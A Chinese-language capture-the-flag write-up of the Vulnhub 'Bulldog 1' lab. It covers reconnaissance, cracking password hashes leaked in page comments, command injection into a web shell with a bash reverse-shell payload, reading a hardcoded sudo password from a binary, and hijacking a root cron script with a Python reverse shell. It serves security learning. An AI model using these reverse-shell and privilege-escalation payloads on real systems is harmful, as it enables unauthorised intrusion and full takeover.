---
title: "Bossplayerctf 1 Vulnhub靶场复现-重走来时路7"
description: "这个靶场的提示还是很有指向性的，打完这个就大一打过的Vulnhub已经复习完毕了"
slug: "vulnhub-bulldog"
pubDate: "2026-08-12"
type: "writeup"
tags: ["Vulnhub"]
lang: "zh-CN"
---

# Bulldog 1 复现 Vulnhub靶场复现-重走来时路

## 靶场介绍与搭建

下载地址 https://vulnhub.com/entry/bulldog-1,211/

介绍

```text
Bulldog Industries recently had its website defaced and owned by the malicious German Shepherd Hack Team. Could this mean there are more vulnerabilities to exploit? Why don't you find out? :)

This is a standard Boot-to-Root. Your only goal is to get into the root directory and see the congratulatory message, how you do it is up to you!

Difficulty: Beginner/Intermediate, if you get stuck, try to figure out all the different ways you can interact with the system. That's my only hint ;)

Made by Nick Frichette (frichetten.com) Twitter: @frichette_n

I'd highly recommend running this on Virtualbox, I had some issues getting it to work in VMware. Additionally DHCP is enabled so you shouldn't have any troubles getting it onto your network. It defaults to bridged mode, but feel free to change that if you like.
```

搭建的话和BossplayerCTF是一样的，搭建靶场部署在 Vitrualbox，网卡设置为 hostonly，回到 VMware 的 kali 上网卡设置为 Bridge 选择 Virtualbox 的网卡。

## 信息收集

### 主机发现

```shell
sudo nmap -sn 10.10.10.0/24
```

得到靶机ip为10.10.10.137

### 端口扫描与漏洞探测

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bulldog1]
└─$ sudo nmap --min-rate 1000 -p- 10.10.10.137
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 03:42 -0400
Nmap scan report for 10.10.10.137
Host is up (0.00087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
23/tcp   open  telnet
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 00:0C:29:76:0D:B9 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 4.04 seconds
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bulldog1]
└─$ sudo nmap -p23,80,8080 -sS -A 10.10.10.137
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-10 03:47 -0400
Nmap scan report for 10.10.10.137
Host is up (0.00069s latency).

PORT     STATE SERVICE VERSION
23/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 20:8b:fc:9e:d9:2e:28:22:6b:2e:0e:e3:72:c5:bb:52 (RSA)
|   256 cd:bd:45:d8:5c:e4:8c:b6:91:e5:39:a9:66:cb:d7:98 (ECDSA)
|_  256 2f:ba:d5:e5:9f:a2:43:e5:3b:24:2c:10:c2:0a:da:66 (ED25519)
80/tcp   open  http    WSGIServer 0.1 (Python 2.7.12)
|_http-server-header: WSGIServer/0.1 Python/2.7.12
|_http-title: Bulldog Industries
8080/tcp open  http    WSGIServer 0.1 (Python 2.7.12)
|_http-server-header: WSGIServer/0.1 Python/2.7.12
|_http-title: Bulldog Industries
MAC Address: 00:0C:29:76:0D:B9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 10.10.10.137

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.47 seconds
```

| 端口 | 服务                              | 标题/版本          | 备注                      |
| ---- | --------------------------------- | ------------------ | ------------------------- |
| 23   | SSH (OpenSSH 7.2p2)               |                    | 登录入口                  |
| 80   | HTTP (WSGIServer / Python 2.7.12) | Bulldog Industries | Web 入口                  |
| 8080 | HTTP (WSGIServer / Python 2.7.12) | Bulldog Industries | 同样是 Web 入口，标题相同 |

### 目录枚举

分别对80 和8080 端口进行目录枚举，发现结果一模一样，说明两个端口跑的是**同一个 Django 应用**，只是多一个入口而已，这里只显示80端口结果

```shell
sudo dirb http://10.10.10.137:80
-----------------
DIRB v2.22
By The Dark Raver
-----------------
START_TIME: Mon Aug 10 03:53:46 2026
URL_BASE: http://10.10.10.137:80/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-----------------
GENERATED WORDS: 4612
---- Scanning URL: http://10.10.10.137:80/ ----
==> DIRECTORY: http://10.10.10.137:80/admin/
==> DIRECTORY: http://10.10.10.137:80/dev/
+ http://10.10.10.137:80/robots.txt (CODE:200|SIZE:1071)
---- Entering directory: http://10.10.10.137:80/admin/ ----
==> DIRECTORY: http://10.10.10.137:80/admin/auth/
==> DIRECTORY: http://10.10.10.137:80/admin/login/
==> DIRECTORY: http://10.10.10.137:80/admin/logout/
---- Entering directory: http://10.10.10.137:80/dev/ ----
==> DIRECTORY: http://10.10.10.137:80/dev/shell/
---- Entering directory: http://10.10.10.137:80/admin/auth/ ----
==> DIRECTORY: http://10.10.10.137:80/admin/auth/group/
==> DIRECTORY: http://10.10.10.137:80/admin/auth/user/
---- Entering directory: http://10.10.10.137:80/admin/login/ ----
---- Entering directory: http://10.10.10.137:80/admin/logout/ ----
---- Entering directory: http://10.10.10.137:80/dev/shell/ ----
---- Entering directory: http://10.10.10.137:80/admin/auth/group/ ----
(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.
    (Try using FineTunning: '-f')
---- Entering directory: http://10.10.10.137:80/admin/auth/user/ ----
(!) WARNING: NOT_FOUND[] not stable, unable to determine correct URLs {30X}.
    (Try using FineTunning: '-f')
```

注意robots.txt /dev/ /admin/

## 漏洞发现及其利用

### 访问网页得到以下文字

```text
Thank you for visiting Bulldog Industries' website, the world's number one purveyor of high quality English Bulldog photography! Unfortunately we are suspending business operations until further notice. On the first of this month, we were made aware of a breach of our technology systems. We are currently assessing the possibility that hackers may have gotten access to customer payment information. Do not be alarmed as we will be providing simple credit monitoring for all affected customers.

For more information on this, please see our public disclosure notice found below.
```

下方有个可交互的public notice 链接指向 /notice

### 访问notice

```text
To our valued customers,

On the first of this month our technical analysts discovered a breach of our payment card systems. I don’t know how these hackers did it. Our technical folk are telling me something about a clam shell and a smelly cow? I'm not sure about all of that.

To prove Bulldog Industries’ commitment to our customers I fired all of our existing technical staff. All of them! We are going to restart from the ground up! No more excuses! Our tech guys will have to make due with what they’ve got. We even increased their budget 1%!

You gotta see the neck beards on the new guys! Real tech hipsters. Zuckerberg types. They know their stuff, security wont be a problem from now on!

I'd like to remind our valued customers that we will be providing basic credit monitoring services as a result of this breach (if you’ve made a purchase of $100 or more).

Your true friend,

Winston Churchy (CEO)
```

### 对robots.txt

```shell
  ________                                       _________.__                  .__                     .___
 /  _____/  ___________  _____ _____    ____    /   _____/|  |__   ____ ______ |  |__   ___________  __| _/
/   \  ____/ __ \_  __ \/     \\__  \  /    \   \_____  \ |  |  \_/ __ \\____ \|  |  \_/ __ \_  __ \/ __ |
\    \_\  \  ___/|  | \/  Y Y  \/ __ \|   |  \  /        \|   Y  \  ___/|  |_> >   Y  \  ___/|  | \/ /_/ |
 \______  /\___  >__|  |__|_|  (____  /___|  / /_______  /|___|  /\___  >   __/|___|  /\___  >__|  \____ |
        \/     \/            \/     \/     \/          \/      \/     \/|__|        \/     \/           \/
			  ___ ___                __     ___________
			 /   |   \_____    ____ |  | __ \__    ___/___ _____    _____
			/    ~    \__  \ _/ ___\|  |/ /   |    |_/ __ \\__  \  /     \
			\    Y    // __ \\  \___|    <    |    |\  ___/ / __ \|  Y Y  \
			 \___|_  /(____  /\___  >__|_ \   |____| \___  >____  /__|_|  /
			       \/      \/     \/     \/              \/     \/      \/

						You got owned
```

访问只有这个 Gerven Shepherd Hack Team You got owned 显然这个是靶场入侵后篡改的ASCII 字符

### 访问/dev/ 发现前端源代码隐藏敏感信息

也是文字内容

```text
If you're reading this you're likely a contractor working for Bulldog Industries. Congratulations! I'm your new boss, Team Lead: Alan Brooke. The CEO has literally fired the entire dev team and staff. As a result, we need to hire a bunch of people very quickly. I'm going to try and give you a crash course on Bulldog Industries website.

**How did the previous website get attacked?**

An APT exploited a vulnerability in the webserver which gave them a low-privilege shell. From there they exploited dirty cow to get root on the box. After that, the entire system was taken over and they defaced the website. We are still transitioning from the old system to the new one. In the mean time we are using some files which may be corrupted from the original system. We haven't had a chance to make sure there were no lingering traces of the hack so if you find any, send me an email.

**How are we preventing future breaches?**

At the request of Mr. Churchy, we are removing PHP entirely from the new server. Additionally we will not be using PHPMyAdmin or any other popular CMS system. We have been tasked with creating our own.

**Design of new system?**

The new website will be written entirely in Django (Mr. Churchy requested "high-end tech hipster stuff"). As of right now, SSH is enabled on the system. This will be turned off soon as we will transition to using Web-Shell, a proprietary shell interface. This tool is explained at the link below. Additionally, be aware that we will start using MongoDB, however we haven't fully installed that yet.

Also be aware that we will be implementing a revolutionary AV system that is being custom made for us by a vendor. It touts being able to run every minute to detect intrusion and hacking. Once that's up and running we will install it on the system.
```

下面有一个web shell 链接，再下面是开发团队的联系人，当然都是虚拟的，不过前端源代码藏了关键注释，隐含敏感信息

```html
|<!--Need these password hashes for testing. Django's default is too complex-->| |<!--We'll remove these in prod. It's not like a hacker can do anything with a hash-->|
|Team Lead: alan@bulldogindustries.com<br /><!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->|
|Back-up Team Lead: william@bulldogindustries.com<br /><br /><!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->|
|Front End: malik@bulldogindustries.com<br /><!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->| |Front
End: kevin@bulldogindustries.com<br /><br /><!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->| |Back
End: ashley@bulldogindustries.com<br /><!--553d917a396414ab99785694afd51df3a8a8a3e0-->| |Back End:
nick@bulldogindustries.com<br /><br /><!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->| |Database:
sarah@bulldogindustries.com<br /><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->|
```

### 访问http://10.10.10.137/dev/shell/

还是文字内容，

```text
## Please authenticate with the server to use Web-Shell
```

### 访问 /admin

一个Django administration 登陆表单

### 总结一下

这个bulldog网站被黑过，现在改了后端架构，有个管理登陆后台，在dev网页下的源代码注释留存过md5加密的字符，也许是这些用户的密码，或许可以用来登陆这个后台。以及dev下有一个webshell目录，告诉我们通过服务器验证来访问，假设后面我们成功登陆到了后台，但是没有可以入手的地方，我们再来返回这个/dev/shell 找线索

目前的线索就在这个这个md5字符，尝试解密看看能不能拿去登陆后台

## md5解密，登陆后台

只有nick 和sarah 对应的 md5爆破解密可以得到，分别是 bulldog 和 bulldoglover

任意一个选一个登陆，这里选择nick的

```text
# Site administration

You don't have permission to edit anything
```

额看起来没有大用，另外一个账户登陆也是同样的内容，只能寄希望与dev/shell

## 回去/dev/shell，验证是否存在命令注入漏洞

刷新一下/dev/shell,验证已经通过

```text
Welcome to Web-Shell! The world's most secure webshell. Web-Shell will prevent users from running dangerous shell commands. It does this by limiting the specific commands that can be run. A list of valid commands can be seen below.

ifconfig
ls
echo
pwd
cat
rm

All commands are run on the server itself, so it is very important to update Web-Shell as soon as possible if a vulnerability is discovered.
```

显示了，可以使用的命令，有一个echo看看能不能写入shell，下面是表单

先在kali进行监听 nc -lvnp 4444

在下面表单构造payload echo "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" | bash

## 命令注入shell成功，得到django权限

```shell
┌──(kali㉿kali)-[~/Labs/Vulnhub/Bulldog1]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.137] 34728
bash: cannot set terminal process group (1001): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

bash: /root/.bashrc: Permission denied
django@bulldog:/home/django/bulldog$
```

python -c"import pty;spawn('/bin/bash')" 升级交互式shell，然后做些常规的信息收集

### django用户权限下的信息收集

```shell
django@bulldog:/home/django/bulldog$ whoami
whoami
django
django@bulldog:/home/django/bulldog$ id
id
uid=1001(django) gid=1001(django) groups=1001(django),27(sudo)
django@bulldog:/home/django/bulldog$ pwd
pwd
/home/django/bulldog
django@bulldog:/home/django/bulldog$ uname -a
uname -a
Linux bulldog 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

## 权限提升

### 查看有什么用户信息

```shell
django@bulldog:/home/django/bulldog$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
bulldogadmin:x:1000:1000:bulldogadmin,,,:/home/bulldogadmin:/bin/bash
django:x:1001:1001:,,,:/home/django:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
django@bulldog:/home/django/bulldog$
```

有个bulldogadmin用户注意

尝试sudo提权，需要密码，走不通

## 尝试suid提权

```shell
django@bulldog:/home/django/bulldog$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/at
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/chfn
/bin/ping
/bin/mount
/bin/umount
/bin/su
/bin/ping6
/bin/fusermount
/bin/ntfs-3g
```

没有明显异常的自定义程序，暂时放弃一下

### 对bulldogadmin用户文件进行枚举

常规sudo，suid提权无果，对这个bulldogadmin用户权限文件枚举看看，寻找更多信息

```shell
django@bulldog:/home/django/bulldog$ find / -user bulldogadmin 2>/dev/null
find / -user bulldogadmin 2>/dev/null
/home/bulldogadmin
/home/bulldogadmin/.nano
/home/bulldogadmin/.bash_logout
/home/bulldogadmin/.cache
/home/bulldogadmin/.wget-hsts
/home/bulldogadmin/.hiddenadmindirectory
/home/bulldogadmin/.hiddenadmindirectory/customPermissionApp
/home/bulldogadmin/.hiddenadmindirectory/note
/home/bulldogadmin/.selected_editor
/home/bulldogadmin/.sudo_as_admin_successful
/home/bulldogadmin/.bashrc
/home/bulldogadmin/.profile
```

/home/bulldogadmin/.hiddenadmindirectory 对这个目录存疑，枚举看看

```shell
django@bulldog:/home/django/bulldog$ cd /home/bulldogadmin/.hiddenadmindirectory
</bulldog$ cd /home/bulldogadmin/.hiddenadmindirectory
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ ls -liah
ls -liah
total 24K
141810 drwxrwxr-x 2 bulldogadmin bulldogadmin 4.0K Sep 21  2017 .
   687 drwxr-xr-x 5 bulldogadmin bulldogadmin 4.0K Sep 21  2017 ..
@8#T@T 1t@t$D���o�@Nbulldogadmin bulldogadmin 8.6K Aug 26  2017 customPermissionApp
141866 -rw-rw-r-- 1 �@�▒VH@H_^���o�@�dogadmin  619 Sep 21  2017 note
django@bulldog:/home/bulldogadmin/.hik���o�@�z�@�▒�B@`▒�`@`▒��@�P����@���@�     �@�x@x4��@��▒� �(`(���8`H`0H4J
cat note                                                                                                      �x▒       �Rdjango@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ s
Nick,

I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not!

It's great stuff! Once I'm finished with it, a hacker wouldn't even be able to reverse it! Keep in mind that it's still a prototype right now. I am about to get it working with the Django user account. I'm not sure how I'll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?

Let me know what you think of it!

-Ashley
```

note 这个文件信息很关键，以及我们可以运行应用程序，输入账户吗，能够判断是否有权限访问文件

还要一个文件 customPermissionApp 想必就是这个运用程序，直接cat输出乱码，没关系

```shell
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ file customPermissionApp
<gadmin/.hiddenadmindirectory$ file customPermissionApp
customPermissionApp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c9f2333253302d74eff3da59653f82d28f9eb36f, not stripped
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ strings customPermissionApp
<gadmin/.hiddenadmindirectory$ strings customPermissionApp
/lib64/ld-linux-x86-64.so.2
32S0-t
libc.so.6
puts
__stack_chk_fail
system
__libc_start_main
__gmon_start__
GLIBC_2.4
GLIBC_2.2.5
UH-H
SUPERultH
imatePASH
SWORDyouH
CANTget
dH34%(
AWAVA
AUATL
[]A\A]A^A_
Please enter a valid username to use root privileges
        Usage: ./customPermissionApp <username>
sudo su root
;*3$"
GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
crtstuff.c
__JCR_LIST__
deregister_tm_clones
__do_global_dtors_aux
completed.7585
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
customPermissionApp.c
__FRAME_END__
__JCR_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
puts@@GLIBC_2.2.5
_edata
__stack_chk_fail@@GLIBC_2.4
system@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
_Jv_RegisterClasses
__TMC_END__
_ITM_registerTMCloneTable
.symtab
.strtab
.shstrtab
.interp
.note.ABI-tag
.note.gnu.build-id
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.jcr
.dynamic
.got.plt
.data
.bss
.comment
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$
```

有个很隐晦难看清楚的信息

SUPERultH
imatePASH
SWORDyouH
CANTget

这个H很多余，可能是strings命令切片的锅，拼接一下就是 SUPERultimatePASSWORDyouCANTget

这下看懂是什么了吧

### 再次sudo 提权

```shell
django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ sudo su
sudo su
[sudo] password for django: SUPERultimatePASSWORDyouCANTget

root@bulldog:/home/bulldogadmin/.hiddenadmindirectory#
```

成功

## 得到flag

```shell
root@bulldog:/home/bulldogadmin/.hiddenadmindirectory# cd /root
cd /root
root@bulldog:~# ls
ls
congrats.txt
root@bulldog:~# cat congrats.txt
cat congrats.txt
Congratulations on completing this VM :D That wasn't so bad was it?

Let me know what you thought on twitter, I'm @frichette_n

As far as I know there are two ways to get root. Can you find the other one?

Perhaps the sequel will be more challenging. Until next time, I hope you enjoyed!
root@bulldog:~#
```

提示我们还有一种可能到root权限，尝试一下

## 寻找新的提权方法

ctrl + c 退出这个shell，重新监听，重新在表单提交注入shell命令,记得升级交互shell，重新枚举一下文件

看看系统有没有安排什么定时任务，以及这些任务是谁执行的

```shell
django@bulldog:/home/django/bulldog$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

没有看到明显的自定义 root 定时任务

但是我们再根据 /etc/cron.d/ 找找有什么线索

```shell
django@bulldog:/home/django/bulldog$ ls -liah /etc/cron.d/
ls -liah /etc/cron.d/
total 24K
131321 drwxr-xr-x  2 root root 4.0K Aug 26  2017 .
131073 drwxr-xr-x 94 root root 4.0K Aug 11 00:47 ..
137250 -rw-r--r--  1 root root  589 Jul 16  2014 mdadm
131322 -rw-r--r--  1 root root  102 Apr  5  2016 .placeholder
137596 -rw-r--r--  1 root root  191 Aug 24  2017 popularity-contest
141859 -rw-r--r--  1 root root   54 Aug 26  2017 runAV
```

这个runAV存疑，读取看看

```shell
django@bulldog:/home/django/bulldog$ cat /etc/cron.d/runAV
cat /etc/cron.d/runAV
*/1 * * * * root /.hiddenAVDirectory/AVApplication.py
```

可以看到之前看到这个hiddle目录下面的这个脚本会被每一分钟以root身份执行一次，

假如说，我们能以当前身份去篡改这个脚本，我们极有可能因为这个配置错误，去提权,先读取一下

```shell
django@bulldog:/home/django/bulldog$ cat /.hiddenAVDirectory/AVApplication.py
cat /.hiddenAVDirectory/AVApplication.py
#!/usr/bin/env python

# Just wanted to throw this placeholder here really quick.
# We will put the full AV here when the vendor is done making it.
# - Alan
django@bulldog:/home/django/bulldog$
```

一个占位脚本，后面用来放av。。。 起初看到这个文件夹名字我还觉得我想歪了，尝试篡改脚本

## 篡改脚本，检验是否存在漏洞

人道主义备份一下

```shell
cp /.hiddenAVDirectory/AVApplication.py /tmp/AVApplication.py.bak
```

```shell
django@bulldog:/home/django/bulldog$ echo 'import os; os.system("id > /tmp/cron_test")' > /.hiddenAVDirectory/AVApplication.py
< os.system("id > /tmp/cron_test")' > /.hiddenAVDirectory/AVApplication.py
```

等一分钟读取在/tmp/cron_test文件看看能不能执行这个id命令,当然也可以手动执行

## 验证漏洞存在，提权成功

再次对这个脚本修改，然后我们先新开一个终端进行监听，nc -lvnp 5555

```shell
printf '#!/usr/bin/env python\nimport socket,os,pty\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect(("10.10.10.10",5555))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\npty.spawn("/bin/bash")\n' > /.hiddenAVDirectory/AVApplication.py
```

等1分钟看看结果

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.137] 44736
root@bulldog:~#
```
